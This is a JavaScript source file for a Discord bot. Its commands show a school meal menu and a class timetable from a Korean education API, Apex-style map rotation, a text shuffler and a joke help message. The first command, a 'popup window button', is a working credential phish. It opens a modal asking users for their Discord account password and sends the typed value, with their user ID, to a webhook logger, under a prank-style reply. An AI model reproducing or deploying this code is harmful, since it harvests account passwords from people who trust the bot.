import {
	createElement,
	useDescription, useString, useNumber, useInteger,
	Fragment, Message, Embed, Field, Modal, Button, Input, Row,
	useButton, useModal, useInput,
} from 'slshx';
import {
	WebLogger,
	ALS_API, NEIS_API,
	setTweaks,
	formatMinutes, escapers,
} from "./modules/tweak_functions";

const Logger = new WebLogger(env.LOGHOOK_ID, env.LOGHOOK_TOKEN);
const NEIS = new NEIS_API(env.NEIS_TOKEN);
const ALS = new ALS_API(env.ALS_TOKEN);
setTweaks(self);



export const 빠빱윈또우뻐뜬 = () => {
	const [popupPassword_id, popupPassword_value] = useInput();
	const popupWindow_id = useModal(interaction => {
		Logger.log(`<@${interaction.member.user.id}> | 빠빱\\_윈또우\\_뻐뜬 > \`\`${escapers.backtick(popupPassword_value)}\`\``);
		
		return (
			<Message ephemeral>
				{`<@${interaction.member.user.id}>`}, 매우 즐거운 귀하의 계정! 당국이 계정을 안전하게 보호할 것이다 입니다.
			</Message>
		);
	});
	const popupWindowButton_id = useButton(() => (
		<Modal id={popupWindow_id} title="이것은 빠빱_윈또우 이다">
			<Input
				id={popupPassword_id}
				label="Discord 계정 비밀번호를 입력해주세요."
				required
			/>
		</Modal>
	));
	

	return () => (
		<Message>
			빠빱\_윈또우\_뻐뜬
			<Row>
				<Button id={popupWindowButton_id} primary>popup_window_button</Button>
			</Row>
		</Message>
	);
};
export const 급식표 = () => {
	const nowDate = Intl.DateTimeFormat('ko-KR', {
		dateStyle: 'long',
		timeZone: "Asia/Seoul",
	}).format(new Date());
	const options = {
		"ATPT_OFCDC_SC_CODE": "J10" /*useString("지역코드")*/,
		"SD_SCHUL_CODE": "7530474" /*useInteger("학교코드")*/,
		"MLSV_YMD": nowDate.replace(/[년월일]\s?/g, '') /*useString("날짜")*/,
	};


	return async function*(interaction) {
		if(!["901544586990743632", "868813672154288128"].includes(interaction?.guild_id)) {
			return <Message>이 명령어는 현재 미공개 상태이며 개발자 서버에서만 이용할 수 있습니다.</Message>;
		}
		yield;
		const api = await NEIS.send('mealServiceDietInfo', options);
		const isError = Object.keys(api.error).length;
		
		return (
			<Message>
				{
					isError?
						<Embed
							title={
								api.error.CODE == "INFO-200"?
									"오늘자 급식이 없습니다."
									:
									"데이터를 불러오는 중 오류가 발생했습니다."
							}
						>
							{api.error.MESSAGE}
						</Embed>
						:
						<>
							<Embed
								title="영양 정보"
								footer={`총 ${api.data[0].CAL_INFO}`}
							>
								{`> 총 ${api.data[0].CAL_INFO}`}
								{
									api.data[0].NTR_INFO.split(/\<br\/?\>/).map(ntr=> {
										const [key, value] = ntr.split(" : ");
										return (
											<Field name={key} inline>
												{value}
											</Field>
										);
									})
								}
							</Embed>
							<Embed
								title="오늘의 급식표"
								footer={api.data[0].MMEAL_SC_NM}
							>
								{
									api.data[0].DDISH_NM.replace(/(\.|\s{2})|\([0-9가-힣/.]+\)/g, '').split(/\<br\/?\>/).join('\n')
								}
							</Embed>
						</>
				}
			</Message>
		);
	};
};
export const 시간표 = () => {
	const nowDate = Intl.DateTimeFormat('ko-KR', {
		dateStyle: 'long',
		timeZone: "Asia/Seoul",
	}).format(new Date());
	const options = {
		"ATPT_OFCDC_SC_CODE": "J10" /*useString("지역코드")*/,
		"SD_SCHUL_CODE": "7530474" /*useInteger("학교코드")*/,
		"GRADE": useInteger("학년"),
		"CLASS_NM": useInteger("반"),
		"ALL_TI_YMD": nowDate.replace(/[년월일]\s?/g, '')
	};


	return async function*(interaction) {
		if(!["901544586990743632", "868813672154288128"].includes(interaction?.guild_id)) {
			return <Message>이 명령어는 현재 미공개 상태이며 개발자 서버에서만 이용할 수 있습니다.</Message>;
		}
		yield;
		const api = await NEIS.send('hisTimetable', options);
		const isError = Object.keys(api.error).length;
		
		return (
			<Message>
				<Embed
					title={
						isError?
							api.error.CODE == "INFO-200"?
								"오늘자 시간표가 없습니다."
								:
								"데이터를 불러오는 중 오류가 발생했습니다."
							:
							`:calendar_spiral: ${api.data[0].GRADE}학년 ${api.data[0].CLASS_NM}반 시간표`
					}
					footer={nowDate}
				>
					{
						isError?
							api.error.MESSAGE
							:
							api.data.map((time, index) => (
								<Field name={`${index+1}교시`}>
									{time.ITRT_CNTNT}
								</Field>
							))
					}
				</Embed>
			</Message>
		);
	};
};
export const 맵 = () => {
	const gamemode = useString("게임모드");


	return async function*() {
		yield;
		const als = await ALS.send("maprotation", {version: 2});
		const data = als[gamemode ?? "battle_royale"];

		return (
			<Message>
				<Embed
					title={`:map: 현재 맵: \`${data.current.map}\``}
					image={data.current.asset}
					footer={`이 맵은 ${formatMinutes(data.current.DurationInMinutes)} 동안 유지됩니다`}
				>
					{`<t:${data.current.start}:R>에 시작되었습니다.`}
				</Embed>
				<Embed
					title={`:map: 다음 맵: \`${data.next.map}\``}
					image={data.next.asset}
					footer={`이 맵은 ${formatMinutes(data.next.DurationInMinutes)} 동안 유지됩니다`}
				>
					{`> <t:${data.next.start}:R>에 시작됩니다.`}
				</Embed>
			</Message>
		);
	};
};
export function 금은가야() {
	const type = useString("기법");
	const msg = useString("메시지");
	const repeat = useNumber("반복") ?? 1;

	
	switch(type){
		case "shuffle": {
			return () => <Message>{escapers.all(msg.repeat(repeat).shuffle().slice(0, 1999))}</Message>;
		};
		case "reverse": {
			return () => <Message>{escapers.all(msg.repeat(repeat).reverse().slice(0, 1999))}</Message>;
		};
		default: {
			return () => <Message>{type}은(는) 존재하지 않는 타입입니다.</Message>;
		};
	};
};
export const 도움말 = () => {
	return () => (
		<Message>
			<Embed title="도움말 목록을 불러오는 중입니다...">
				{`예상 완료 시간 : \`${formatMinutes(randomInt(96854851, 6857485141))}\``}
			</Embed>
		</Message>
	);
};